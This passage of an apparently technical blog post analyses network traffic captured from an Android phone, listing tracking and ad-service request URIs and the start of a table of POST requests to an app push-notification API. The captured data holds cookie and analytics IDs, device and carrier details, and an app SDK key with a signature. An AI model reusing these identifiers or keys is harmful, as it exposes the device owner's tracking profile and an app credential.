                            /collect?v=1&amp;_v=j15&amp;aip=1&amp;a=725159496&amp;t=pageview&amp;_s=1&amp;dl=http%3A%2F%2Fwww.sueddeutsche.de%2Fmuenchen%2Fmuenchen-haidhausen-ploetzlich-zehn-meter-tiefes-loch-im-gehweg-1.1866074&amp;dr=http%3A%2F%2Fflipboard.com%2Fredirect%3Furl%3Dhttp%253A%252F%252Fwww.sueddeutsche.de%252Fmuenchen%252Fmuenchen-haidhausen-ploetzlich-zehn-meter-tiefes-loch-im-gehweg-1.1866074&amp;ul=de-de&amp;de=UTF-8&amp;dt=M%C3%BCnchen-Haidhausen%20-%20Zehn%20Meter%20tiefes%20Loch%20im%20Gehweg%20-%20M%C3%BCnchen%20-%20S%C3%BCddeutsche.de&amp;sd=32-bit&amp;sr=800&amp;#215;1280&amp;vp=479&amp;#215;710&amp;je=0&amp;_utma=6611437.1403719128.1390050886.1390050886.1390050886.1&amp;_utmz=6611437.1390050886.1.1.utmcsr%3Dflipboard.com%7Cutmccn%3D(referral)%7Cutmcmd%3Dreferral%7Cutmcct%3D%2Fredirect&amp;_utmht=1390050891510&amp;_u=cQAC~&amp;cid=1403719128.1390050886&amp;tid=UA-19474199-5&amp;cd1=200&amp;z=859363407
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            177
                          &lt;/th&gt;

                          &lt;td&gt;
                            www.googleadservices.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /__utm.gif?utmwv=5.4.6dc&amp;utms=1&amp;utmn=1993705442&amp;utmhn=www.sueddeutsche.de&amp;utme=8(Vermarktbar*Thema*Ressort*Dokumenttyp*URL)9(y*hochschulen*karriere*artikel*http%3A%2F%2Fwww.sueddeutsche.de%2Fkarriere%2Fstudie-hunderttausende-akademiker-arbeiten-fuer-niedrigloehne-1.1866212)&amp;utmcs=UTF-8&amp;utmsr=800&amp;#215;1280&amp;utmvp=479&amp;#215;710&amp;utmsc=32-bit&amp;utmul=de-de&amp;utmje=0&amp;utmfl=-&amp;utmdt=Hunderttausende%20Akademiker%20arbeiten%20zu%20Niederl%C3%B6hnen%20-%20Karriere%20-%20S%C3%BCddeutsche.de&amp;utmhid=1403566109&amp;utmr=http%3A%2F%2Fflipboard.com%2Fredirect%3Furl%3Dhttp%253A%252F%252Fwww.sueddeutsche.de%252Fkarriere%252Fstudie-hunderttausende-akademiker-arbeiten-fuer-niedrigloehne-1.1866212&amp;utmp=%2Fnachrichten_mobile%2Fkarriere%2Fthema%2Fhochschulen%2Fartikel%2Fstudie-hunderttausende-akademiker-arbeiten-fuer-niedrigloehne&amp;utmht=1390147627125&amp;utmac=UA-19474199-2&amp;utmcc=__utma%3D6611437.1403719128.1390050886.1390050886.1390147627.2%3B%2B__utmz%3D6611437.1390147627.2.2.utmcsr%3Dflipboard.com%7Cutmccn%3D(referral)%7Cutm...
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            178
                          &lt;/th&gt;

                          &lt;td&gt;
                            www.googleadservices.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /__utm.gif?utmwv=5.4.6dc&amp;utms=2&amp;utmn=1670436209&amp;utmhn=www.sueddeutsche.de&amp;utme=8(Vermarktbar*Thema*Ressort*Dokumenttyp*URL)9(y*streaming*digital*artikel*http%3A%2F%2Fwww.sueddeutsche.de%2Fdigital%2Fstreamseite-redtube-loechriges-gutachten-bringt-porno-abmahner-in-bedraengnis-1.1866025)&amp;utmcs=UTF-8&amp;utmsr=800&amp;#215;1280&amp;utmvp=479&amp;#215;710&amp;utmsc=32-bit&amp;utmul=de-de&amp;utmje=0&amp;utmfl=-&amp;utmdt=Redtube%3A%20Gutachten%20setzt%20Porno-Abmahner%20unter%20Druck%20-%20Digital%20-%20S%C3%BCddeutsche.de&amp;utmhid=2138069351&amp;utmr=http%3A%2F%2Fflipboard.com%2Fredirect%3Furl%3Dhttp%253A%252F%252Fwww.sueddeutsche.de%252Fdigital%252Fstreamseite-redtube-loechriges-gutachten-bringt-porno-abmahner-in-bedraengnis-1.1866025&amp;utmp=%2Fnachrichten_mobile%2Fdigital%2Fthema%2Fstreaming%2Fartikel%2Fstreamseite-redtube-loechriges-gutachten-bringt-porno-abmahner-in-bedraengnis&amp;utmht=1390051327076&amp;utmac=UA-19474199-2&amp;utmcc=__utma%3D6611437.1403719128.1390050886.1390050886.1390050886.1%3B%2B__utmz%3D6611437.1390050886.1.1.utmcsr%3Dfli...
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            179
                          &lt;/th&gt;

                          &lt;td&gt;
                            www.googleadservices.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /gampad/ads?gdfp_req=1&amp;correlator=2717019624439808&amp;output=json_html&amp;callback=window.parent.googletag.impl.pubads.setAdContentsBySlotForAsync&amp;impl=fifs&amp;json_a=1&amp;iu_parts=3467634%2CNews_960x250%2CForum_728x90_below_2000px%2CForum_160x600%2CForum_300x250&amp;enc_prev_ius=%2F0%2F1%2C%2F0%2F2%2C%2F0%2F3%2C%2F0%2F4&amp;prev_iu_szs=960&amp;#215;250%2C728x90%2C160x600%2C300x250&amp;cookie=ID%3D255c5e010379289e%3AT%3D1388960731%3AS%3DALNI_MY6lVEnV1B2yGODKsTz1EtTNK_Lkw&amp;lmt=1390120036&amp;dt=1390123636720&amp;cc=33&amp;biw=320&amp;bih=240&amp;oid=3&amp;gut=v2&amp;ifi=1&amp;u_tz=60&amp;u_his=3&amp;u_h=1280&amp;u_w=800&amp;u_ah=1280&amp;u_aw=800&amp;u_cd=32&amp;u_sd=1.67&amp;flash=0&amp;url=http%3A%2F%2Fwww.androidpit.de%2Fde%2Fandroid%2Fforum%2Fthread%2F573726%2Fslimbean-Build-4-3&amp;adks=2176111127%2C1806238677%2C1358297623%2C956443525&amp;vrg=32&amp;vrp=32&amp;ga_vid=678182810.1388960726&amp;ga_sid=1390123637&amp;ga_hid=587405764&amp;ga_fc=true
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            180
                          &lt;/th&gt;

                          &lt;td&gt;
                            www.googleadservices.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /pagead/ads?client=ca-pub-1817266450476915&amp;output=html&amp;h=15&amp;slotname=4078688437&amp;adk=2218119946&amp;w=760&amp;lmt=1389611295&amp;color_bg=fbfbfb&amp;color_border=fbfbfb&amp;color_link=43a8da&amp;flash=0&amp;url=http%3A%2F%2Fwww.androidpit.de%2Fde%2Fandroid%2Fforum%2Fthread%2F573726%2Fslimbean-Build-4-3&amp;dt=1389614895459&amp;shv=r20140107&amp;cbv=r20140107&amp;saldr=sb&amp;correlator=1389614893677&amp;frm=20&amp;ga_vid=678182810.1388960726&amp;ga_sid=1389614896&amp;ga_hid=2144196175&amp;ga_fc=1&amp;u_tz=60&amp;u_his=3&amp;u_java=0&amp;u_h=1280&amp;u_w=800&amp;u_ah=1280&amp;u_aw=800&amp;u_cd=32&amp;u_nplug=0&amp;u_nmime=0&amp;dff=arial&amp;dfs=13&amp;adx=169&amp;ady=1303&amp;biw=320&amp;bih=240&amp;eid=33895331%2C317150312&amp;oid=3&amp;unviewed_position_start=1&amp;rx=0&amp;fc=2&amp;vis=0&amp;fu=0&amp;ifi=6&amp;xpc=9WAELiVzU0&amp;p=http%3A//www.androidpit.de&amp;dtd=57
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            181
                          &lt;/th&gt;

                          &lt;td&gt;
                            www.googleadservices.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /pagead/ads?client=ca-pub-1817266450476915&amp;output=html&amp;h=600&amp;slotname=2883975723&amp;adk=345326614&amp;w=160&amp;lmt=1388957132&amp;ea=0&amp;flash=0&amp;url=http%3A%2F%2Fwww.androidpit.de%2Fde%2Fandroid%2Fforum%2Fthread%2F573726%2Fslimbean-Build-4-3&amp;dt=1388960732211&amp;shv=r20131210&amp;cbv=r20131209&amp;saldr=sb&amp;correlator=1388960732235&amp;frm=23&amp;ga_vid=678182810.1388960726&amp;ga_sid=1388960726&amp;ga_hid=2129303418&amp;ga_fc=1&amp;u_tz=60&amp;u_his=3&amp;u_java=0&amp;u_h=1280&amp;u_w=800&amp;u_ah=1280&amp;u_aw=800&amp;u_cd=32&amp;u_nplug=0&amp;u_nmime=0&amp;dff=sans-serif&amp;dfs=16&amp;adx=-160&amp;ady=545&amp;biw=980&amp;bih=1410&amp;isw=160&amp;ish=600&amp;ifk=3896278517&amp;eid=317150311&amp;oid=3&amp;rs=0&amp;frmn=0&amp;vis=0&amp;fu=4&amp;ifi=1&amp;dtd=90
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            182
                          &lt;/th&gt;

                          &lt;td&gt;
                            www.googleadservices.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /pagead/ads?client=ca-pub-1817266450476915&amp;output=html&amp;h=90&amp;slotname=9765689251&amp;adk=1289075668&amp;w=728&amp;lmt=1388957132&amp;ea=0&amp;flash=0&amp;url=http%3A%2F%2Fwww.androidpit.de%2Fde%2Fandroid%2Fforum%2Fthread%2F573726%2Fslimbean-Build-4-3&amp;dt=1388960732054&amp;shv=r20131210&amp;cbv=r20131209&amp;saldr=sb&amp;correlator=1388960732091&amp;frm=23&amp;ga_vid=678182810.1388960726&amp;ga_sid=1388960726&amp;ga_hid=2105133366&amp;ga_fc=1&amp;u_tz=60&amp;u_his=3&amp;u_java=0&amp;u_h=1280&amp;u_w=800&amp;u_ah=1280&amp;u_aw=800&amp;u_cd=32&amp;u_nplug=0&amp;u_nmime=0&amp;dff=sans-serif&amp;dfs=16&amp;adx=144&amp;ady=3786&amp;biw=980&amp;bih=1410&amp;isw=728&amp;ish=90&amp;ifk=82575363&amp;eid=317150313&amp;oid=3&amp;rs=0&amp;brdim=0%2C129%2C0%2C129%2C800%2C0%2C800%2C1151%2C728%2C90&amp;vis=0&amp;fu=4&amp;ifi=1&amp;dtd=104
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            183
                          &lt;/th&gt;

                          &lt;td&gt;
                            www.googleadservices.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /pagead/adview?ai=B6BlkasLaUuL8KO3xyAPQpIDYCLX2uJoGAAAAEAEgADgAWL3F_pWHAWCVAoIBF2NhLXB1Yi0yNjE0NjY2MjYxNTc5NzQxsgEYd3d3LmRjbGstZGVmYXVsdC1yZWYuY29tugEJZ2ZwX2ltYWdlyAEJ2gEgaHR0cDovL3d3dy5kY2xrLWRlZmF1bHQtcmVmLmNvbS_AAgLgAgDqAhg0MDYxL2FwcC55dGhvbWUvX2RlZmF1bHT4Av3RHoADAZADjAaYA6QDqAMB4AQBoAYg2AYC&amp;sigh=ccaofuJWBm0&amp;adurl=
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            184
                          &lt;/th&gt;

                          &lt;td&gt;
                            www.googleadservices.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /pagead/adview?ai=B6rsTicLaUoXYAo2i-gbf94GQCq25_c0EAAAAEAEgADgAUOaLpZ74_____wFY9b6FpWtglQKCARdjYS1wdWItMjYxNDY2NjI2MTU3OTc0MbIBGHd3dy5kY2xrLWRlZmF1bHQtcmVmLmNvbboBCWdmcF9pbWFnZcgBAtoBIGh0dHA6Ly93d3cuZGNsay1kZWZhdWx0LXJlZi5jb20vwAIC4AIA6gIpNDA2MS9hcHAueXRwd2F0Y2guZW50ZXJ0YWlubWVudC9tYWluXzg5Mzj4Av3RHpADjAaYA6QDqAMB0ASQTuAEAaAGMtgGAg&amp;sigh=Vq7JIfuxoVI
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            185
                          &lt;/th&gt;

                          &lt;td&gt;
                            www.googleadservices.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /pagead/conversion/1001680686/?label=4dahCKKczAYQrt7R3QM&amp;value=&amp;muid=myTNNlwjHP2x7sOPdZUceA&amp;bundleid=com.google.android.youtube&amp;appversion=5.3.32&amp;osversion=4.3.1&amp;sdkversion=ct-sdk-a-v1.1.0&amp;remarketing_only=1&amp;timestamp=1390052022&amp;data=screen_name%3D%3CAndroid_YT_Open_App%3E
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            186
                          &lt;/th&gt;

                          &lt;td&gt;
                            www.googleadservices.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /pagead/conversion/1001680686/?label=4dahCKKczAYQrt7R3QM&amp;value=&amp;muid=myTNNlwjHP2x7sOPdZUceA&amp;bundleid=com.google.android.youtube&amp;appversion=5.3.32&amp;osversion=4.3.1&amp;sdkversion=ct-sdk-a-v1.1.0&amp;remarketing_only=1&amp;timestamp=1390053879&amp;data=screen_name%3D%3CAndroid_YT_Open_App%3E
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            187
                          &lt;/th&gt;

                          &lt;td&gt;
                            www.googleadservices.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /pagead/conversion/1001680686/?label=4dahCKKczAYQrt7R3QM&amp;value=&amp;muid=myTNNlwjHP2x7sOPdZUceA&amp;bundleid=com.google.android.youtube&amp;appversion=5.3.32&amp;osversion=4.3.1&amp;sdkversion=ct-sdk-a-v1.1.0&amp;remarketing_only=1&amp;timestamp=1390068090&amp;data=screen_name%3D%3CAndroid_YT_Open_App%3E
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            188
                          &lt;/th&gt;

                          &lt;td&gt;
                            www.googleadservices.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /pagead/conversion/1001680686/?label=4dahCKKczAYQrt7R3QM&amp;value=&amp;muid=myTNNlwjHP2x7sOPdZUceA&amp;bundleid=com.google.android.youtube&amp;appversion=5.3.32&amp;osversion=4.3.1&amp;sdkversion=ct-sdk-a-v1.1.0&amp;remarketing_only=1&amp;timestamp=1390068519&amp;data=screen_name%3D%3CAndroid_YT_Open_App%3E
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            189
                          &lt;/th&gt;

                          &lt;td&gt;
                            www.googleadservices.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /pagead/conversion/1001680686/?label=4dahCKKczAYQrt7R3QM&amp;value=&amp;muid=myTNNlwjHP2x7sOPdZUceA&amp;bundleid=com.google.android.youtube&amp;appversion=5.3.32&amp;osversion=4.3.1&amp;sdkversion=ct-sdk-a-v1.1.0&amp;remarketing_only=1&amp;timestamp=1390083647&amp;data=screen_name%3D%3CAndroid_YT_Open_App%3E
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            190
                          &lt;/th&gt;

                          &lt;td&gt;
                            www.googleadservices.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /pagead/conversion/1001680686/?label=4dahCKKczAYQrt7R3QM&amp;value=&amp;muid=myTNNlwjHP2x7sOPdZUceA&amp;bundleid=com.google.android.youtube&amp;appversion=5.3.32&amp;osversion=4.3.1&amp;sdkversion=ct-sdk-a-v1.1.0&amp;remarketing_only=1&amp;timestamp=1390148833&amp;data=screen_name%3D%3CAndroid_YT_Open_App%3E
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            191
                          &lt;/th&gt;

                          &lt;td&gt;
                            www.googleadservices.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /pixel?google_nid=9675309&amp;google_hm=bnRnR1JQd0IzMVlhMThxY2xKQlJkZFFRYVBNcnhnTFo%3D&amp;google_cm&amp;google_sc
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            192
                          &lt;/th&gt;

                          &lt;td&gt;
                            www.googleadservices.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /pixel?google_nid=9675309&amp;google_hm=bnRnR1JQd0IzMVlhMThxY2xKQlJkZFFRYVBNcnhnTFo%3D&amp;google_cm=&amp;google_sc=&amp;google_tc=
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            193
                          &lt;/th&gt;

                          &lt;td&gt;
                            www.googleadservices.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /simgad/16975570946260456591
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            194
                          &lt;/th&gt;

                          &lt;td&gt;
                            www.googleadservices.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /simgad/17705960718182275898
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            195
                          &lt;/th&gt;

                          &lt;td&gt;
                            www.googleapis.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /css?family=Open+Sans:400,600&amp;subset=latin,cyrillic
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            196
                          &lt;/th&gt;

                          &lt;td&gt;
                            www.googleapis.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /css?family=Roboto:300
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            197
                          &lt;/th&gt;

                          &lt;td&gt;
                            www.googleapis.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /maps/api/elevation/xml?locations=52.501904,13.342198&amp;sensor=false
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            198
                          &lt;/th&gt;

                          &lt;td&gt;
                            www.googletagmanager.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /gtm.js?id=GTM-PXNL5Z
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            199
                          &lt;/th&gt;

                          &lt;td&gt;
                            www.googletagservices.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /__utm.gif?utmwv=5.4.6dc&amp;utms=1&amp;utmn=1807714930&amp;utmhn=www.sueddeutsche.de&amp;utme=8(Vermarktbar*Thema*Ressort*Dokumenttyp*URL)9(y*unfall*muenchen*artikel*http%3A%2F%2Fwww.sueddeutsche.de%2Fmuenchen%2Fmuenchen-haidhausen-ploetzlich-zehn-meter-tiefes-loch-im-gehweg-1.1866074)&amp;utmcs=UTF-8&amp;utmsr=800&amp;#215;1280&amp;utmvp=479&amp;#215;710&amp;utmsc=32-bit&amp;utmul=de-de&amp;utmje=0&amp;utmfl=-&amp;utmdt=M%C3%BCnchen-Haidhausen%20-%20Zehn%20Meter%20tiefes%20Loch%20im%20Gehweg%20-%20M%C3%BCnchen%20-%20S%C3%BCddeutsche.de&amp;utmhid=725159496&amp;utmr=http%3A%2F%2Fflipboard.com%2Fredirect%3Furl%3Dhttp%253A%252F%252Fwww.sueddeutsche.de%252Fmuenchen%252Fmuenchen-haidhausen-ploetzlich-zehn-meter-tiefes-loch-im-gehweg-1.1866074&amp;utmp=%2Fnachrichten_mobile%2Fmuenchen%2Fthema%2Funfall%2Fartikel%2Fmuenchen-haidhausen-ploetzlich-zehn-meter-tiefes-loch-im-gehweg&amp;utmht=1390050886104&amp;utmac=UA-19474199-2&amp;utmcc=__utma%3D6611437.1403719128.1390050886.1390050886.1390050886.1%3B%2B__utmz%3D6611437.1390050886.1.1.utmcsr%3Dflipboard.com%7Cutmccn%3D(referral...
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            200
                          &lt;/th&gt;

                          &lt;td&gt;
                            www.hr-online.de
                          &lt;/td&gt;

                          &lt;td&gt;
                            /servlet/de.hr.cms.servlet.IMS?enc=d3M9aHJteXNxbCZibG9iSWQ9MTg3NTgyMTQmaWQ9NTA1OTg2ODU_
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            201
                          &lt;/th&gt;

                          &lt;td&gt;
                            www.neues-deutschland.de
                          &lt;/td&gt;

                          &lt;td&gt;
                            /img/t/86771
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            202
                          &lt;/th&gt;

                          &lt;td&gt;
                            www.tagesschau.de
                          &lt;/td&gt;

                          &lt;td&gt;
                            /resources/framework/css/fonts/TheSans_LT_TT5_.svg
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            203
                          &lt;/th&gt;

                          &lt;td&gt;
                            www.tagesschau.de
                          &lt;/td&gt;

                          &lt;td&gt;
                            /resources/framework/css/fonts/TheSans_LT_TT5i.svg
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            204
                          &lt;/th&gt;

                          &lt;td&gt;
                            www.tagesschau.de
                          &lt;/td&gt;

                          &lt;td&gt;
                            /resources/framework/css/fonts/TheSans_LT_TT7_.svg
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            205
                          &lt;/th&gt;

                          &lt;td&gt;
                            www.taz.de
                          &lt;/td&gt;

                          &lt;td&gt;
                            /Essay-zur-Zuwanderung-aus-Osteuropa/!131209/
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            206
                          &lt;/th&gt;

                          &lt;td&gt;
                            www.taz.de
                          &lt;/td&gt;

                          &lt;td&gt;
                            /Essay-zur-Zuwanderung-aus-Osteuropa/!131209;m/
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            207
                          &lt;/th&gt;

                          &lt;td&gt;
                            www.taz.de
                          &lt;/td&gt;

                          &lt;td&gt;
                            /digitaz/cntres/szmmobil_Debatte-Artikel/ecnt/4702537358.taz/countergif
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            208
                          &lt;/th&gt;

                          &lt;td&gt;
                            www.theverge.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /rss/index.xml
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            209
                          &lt;/th&gt;

                          &lt;td&gt;
                            www.youtube-nocookie.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /device_204?app_anon_id=6988a4be-80bf-4a77-9581-f98c234a176f&amp;firstactive=1389027600&amp;firstactivegeo=DE&amp;firstlogin=1389027600&amp;prevactive=1390003200&amp;prevlogin=1390003200&amp;loginstate=1&amp;cplatform=mobile&amp;c=android&amp;cver=5.3.32&amp;cos=Android&amp;cosver=4.3.1&amp;cbr=&lt;span style=&quot;background-color: #00ff00;&quot;&gt;com.google.android.youtube&lt;/span&gt;&amp;&lt;span style=&quot;background-color: #00ff00;&quot;&gt;cbrver=5.3.32&amp;cbrand=samsung&amp;cmodel=GT-N7000&amp;cnetwork=o2%20-%20de&lt;/span&gt;
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            210
                          &lt;/th&gt;

                          &lt;td&gt;
                            www.youtube.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /leanback_ajax?action_environment=1
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            211
                          &lt;/th&gt;

                          &lt;td&gt;
                            www.youtube.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /ptracking?ptk=KontorRecords&amp;video_id=GoYrjCkN3Q4&amp;ptchn=b3tJ5NKw7mDxyaQ73mwbRg&amp;plid=AATwQoLNVKjFDu_5&amp;oid=SqRrmZwFybZNrAc1Oh_HdQ&amp;pltype=content
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            212
                          &lt;/th&gt;

                          &lt;td&gt;
                            xtra2.gpsonextra.net
                          &lt;/td&gt;

                          &lt;td&gt;
                            /xtra.bin
                          &lt;/td&gt;
                        &lt;/tr&gt;
</code></pre>
</table>
</div>
<h4 id="post-requests">POST requests</h4>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.sql" data-lang=".sql">p3<span style="color:#666"> </span>=<span style="color:#666"> </span>pdsql.<span style="color:#447fcf">read_frame</span>(<span style="color:#ed9d13">&#34;&#34;&#34;
</span><span style="color:#ed9d13">    SELECT h.frame_number, d.dns_query, h.request_uri, h.data, h.text FROM http AS  h
</span><span style="color:#ed9d13">    JOIN dns AS d ON h.ip_dst = d.dns_response
</span><span style="color:#ed9d13">    WHERE lower(h.request_method) == &#39;post&#39;
</span><span style="color:#ed9d13">    ORDER by h.ip_dst
</span><span style="color:#ed9d13">&#34;&#34;&#34;</span>,<span style="color:#666"> </span>con)<span style="color:#666">
</span><span style="color:#666"></span>p3.<span style="color:#447fcf">head</span>(<span style="color:#3677a9">500</span>)<span style="color:#666">
</span></code></pre></div><div class="table-responsive">
<table class="table">
                                <tr align="left">
                                  <th style="width: 40px;">
                                    Â 
                                  </th>
<pre><code>                              &lt;th&gt;
                                dns_query
                              &lt;/th&gt;

                              &lt;th&gt;
                                request_uri
                              &lt;/th&gt;

                              &lt;th&gt;
                                data
                              &lt;/th&gt;
                            &lt;/tr&gt;

                            &lt;tr&gt;
                              &lt;th&gt;0
                              &lt;/th&gt;

                              &lt;td&gt;
                                saas.appoxee.com
                              &lt;/td&gt;

                              &lt;td&gt;
                                /api/
                              &lt;/td&gt;

                              &lt;td&gt;
                                {`action`:`getServerTime`,`auth`:{`random`:`1119413a297389c129790915258b4825171&amp;#8243;,`timestamp`:13900538708,`AppSDKKey`:`3ec0fb21-759c-4169-9fed-44efda1ea246&amp;#8243;,`signature`:`fdfc1bbba1ab6eb97a59e08c49e3271a`}}
                              &lt;/td&gt;
                            &lt;/tr&gt;

                            &lt;tr&gt;
                              &lt;th&gt;
                                1
                              &lt;/th&gt;

                              &lt;td&gt;
                                saas.appoxee.com
                              &lt;/td&gt;

                              &lt;td&gt;
                                /api/
                              &lt;/td&gt;

                              &lt;td&gt;
                                {`action`:`getServerTime`,`auth`:{`random`:`1119413a297389c129790915258b4825171&amp;#8243;,`timestamp`:13900538708,`AppSDKKey`:`3ec0fb21-759c-4169-9fed-44efda1ea246&amp;#8243;,`signature`:`fdfc1bbba1ab6eb97a59e08c49e3271a`}}
                              &lt;/td&gt;
                            &lt;/tr&gt;

                            &lt;tr&gt;
                              &lt;th&gt;
                                2
                              &lt;/th&gt;

                              &lt;td&gt;
                                saas.appoxee.com
                              &lt;/td&gt;

                              &lt;td&gt;
                                /api/
                              &lt;/td&gt;

                              &lt;td&gt;
                                {`action`:`getServerTime`,`auth`:{`random`:`1119413a297389c129790915258b4825171&amp;#8243;,`timestamp`:13900538708,`AppSDKKey`:`3ec0fb21-759c-4169-9fed-44efda1ea246&amp;#8243;,`signature`:`fdfc1bbba1ab6eb97a59e08c49e3271a`}}
                              &lt;/td&gt;
                            &lt;/tr&gt;

                            &lt;tr&gt;
                              &lt;th&gt;
                                3
                              &lt;/th&gt;

                              &lt;td&gt;
                                saas.appoxee.com
                              &lt;/td&gt;

                              &lt;td&gt;
                                /api/
                              &lt;/td&gt;

                              &lt;td&gt;
                                {`action`:`getServerTime`,`auth`:{`random`:`1119413a297389c129790915258b4825171&amp;#8243;,`timestamp`:13900538708,`AppSDKKey`:`3ec0fb21-759c-4169-9fed-44efda1ea246&amp;#8243;,`signature`:`fdfc1bbba1ab6eb97a59e08c49e3271a`}}
                              &lt;/td&gt;
                            &lt;/tr&gt;

                            &lt;tr&gt;
                              &lt;th&gt;
                                4
                              &lt;/th&gt;

                              &lt;td&gt;
                                saas.appoxee.com
                              &lt;/td&gt;

                              &lt;td&gt;
                                /api/
                              &lt;/td&gt;

                              &lt;td&gt;
                                {`action`:`getServerTime`,`auth`:{`random`:`1119413a297389c129790915258b4825171&amp;#8243;,`timestamp`:13900538708,`AppSDKKey`:`3ec0fb21-759c-4169-9fed-44efda1ea246&amp;#8243;,`signature`:`fdfc1bbba1ab6eb97a59e08c49e3271a`}}
                              &lt;/td&gt;
                            &lt;/tr&gt;

                            &lt;tr&gt;
                              &lt;th&gt;
                                5
                              &lt;/th&gt;

                              &lt;td&gt;
                                saas.appoxee.com
                              &lt;/td&gt;

                              &lt;td&gt;
                                /api/
                              &lt;/td&gt;

                              &lt;td&gt;
                                {`action`:`getServerTime`,`auth`:{`random`:`1119413a297389c129790915258b4825171&amp;#8243;,`timestamp`:13900538708,`AppSDKKey`:`3ec0fb21-759c-4169-9fed-44efda1ea246&amp;#8243;,`signature`:`fdfc1bbba1ab6eb97a59e08c49e3271a`}}
                              &lt;/td&gt;
                            &lt;/tr&gt;

                            &lt;tr&gt;
                              &lt;th&gt;
                                6
                              &lt;/th&gt;

                              &lt;td&gt;
                                saas.appoxee.com
                              &lt;/td&gt;

                              &lt;td&gt;
                                /api/
                              &lt;/td&gt;

                              &lt;td&gt;
